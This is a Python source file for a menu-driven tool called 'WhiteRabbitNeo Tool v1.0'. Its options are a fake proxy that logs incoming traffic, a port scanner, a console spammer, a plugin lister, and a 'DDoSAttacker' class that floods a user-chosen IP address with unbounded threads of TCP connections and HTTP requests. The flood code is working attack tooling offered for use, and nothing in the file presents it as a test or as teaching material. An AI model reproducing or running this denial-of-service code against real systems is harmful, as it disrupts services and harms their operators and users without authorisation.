import socket
import threading
import random
import os
import time

class FakeProxy:
    def __init__(self, host, port):
        self.host = host
        self.port = port
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.sock.bind((self.host, self.port))
        self.sock.listen(5)
        print(f"[+] Fake Proxy listening on {self.host}:{self.port}")

    def handle_client(self, client_sock, addr):
        print(f"[+] New connection from {addr[0]}:{addr[1]}")
        while True:
            data = client_sock.recv(1024)
            if not data:
                break
            print(f"[+] Received data: {data.decode()}")
            client_sock.send(b"HTTP/1.1 200 OK\r\n\r\n")
        client_sock.close()
        print(f"[-] Connection closed from {addr[0]}:{addr[1]}")

    def start(self):
        while True:
            client_sock, addr = self.sock.accept()
            client_thread = threading.Thread(target=self.handle_client, args=(client_sock, addr))
            client_thread.start()

class PortScanner:
    def __init__(self, host, ports):
        self.host = host
        self.ports = ports

    def scan(self):
        print(f"[+] Scanning {self.host} for open ports...")
        for port in self.ports:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(1)
            try:
                result = sock.connect_ex((self.host, port))
                if result == 0:
                    print(f"[+] Port {port} is open")
                sock.close()
            except:
                pass

class ConsoleSpammer:
    def __init__(self, message, delay):
        self.message = message
        self.delay = delay

    def spam(self):
        while True:
            print(self.message)
            time.sleep(self.delay)

class DDoSAttacker:
    def __init__(self, target, threads):
        self.target = target
        self.threads = threads

    def attack(self):
        print(f"[+] Starting DDoS attack on {self.target} with {self.threads} threads...")
        for _ in range(self.threads):
            thread = threading.Thread(target=self.send_requests)
            thread.start()

    def send_requests(self):
        while True:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            try:
                sock.connect((self.target, 80))
                sock.send(b"GET / HTTP/1.1\r\nHost: example.com\r\n\r\n")
                sock.close()
            except:
                pass

class PluginViewer:
    def __init__(self, plugins_dir):
        self.plugins_dir = plugins_dir

    def view_plugins(self):
        print(f"[+] Viewing plugins in {self.plugins_dir}:")
        for plugin in os.listdir(self.plugins_dir):
            print(f"  - {plugin}")

def main():
    print("[+] WhiteRabbitNeo Tool v1.0")
    print("[+] Select an option:")
    print("  1. Fake Proxy")
    print("  2. Port Scanner")
    print("  3. Console Spammer")
    print("  4. DDoS Attacker")
    print("  5. Plugin Viewer")
    print("  6. Exit")

    choice = input("[+] Enter your choice (1-6): ")

    if choice == "1":
        host = input("[+] Enter the host to listen on (default: 0.0.0.0): ") or "0.0.0.0"
        port = int(input("[+] Enter the port to listen on (default: 8080): ") or "8080")
        fake_proxy = FakeProxy(host, port)
        fake_proxy.start()
    elif choice == "2":
        host = input("[+] Enter the host to scan: ")
        ports = input("[+] Enter the ports to scan (comma-separated): ")
        ports = [int(p) for p in ports.split(",")]
        scanner = PortScanner(host, ports)
        scanner.scan()
    elif choice == "3":
        message = input("[+] Enter the message to spam: ")
        delay = float(input("[+] Enter the delay between messages (in seconds): "))
        spammer = ConsoleSpammer(message, delay)
        spammer.spam()
    elif choice == "4":
        target = input("[+] Enter the target IP address: ")
        threads = int(input("[+] Enter the number of threads: "))
        attacker = DDoSAttacker(target, threads)
        attacker.attack()
    elif choice == "5":
        plugins_dir = input("[+] Enter the directory containing plugins: ")
        viewer = PluginViewer(plugins_dir)
        viewer.view_plugins()
    elif choice == "6":
        print("[+] Exiting...")
        exit()
    else:
        print("[+] Invalid choice. Exiting...")
        exit()

if __name__ == "__main__":
    main()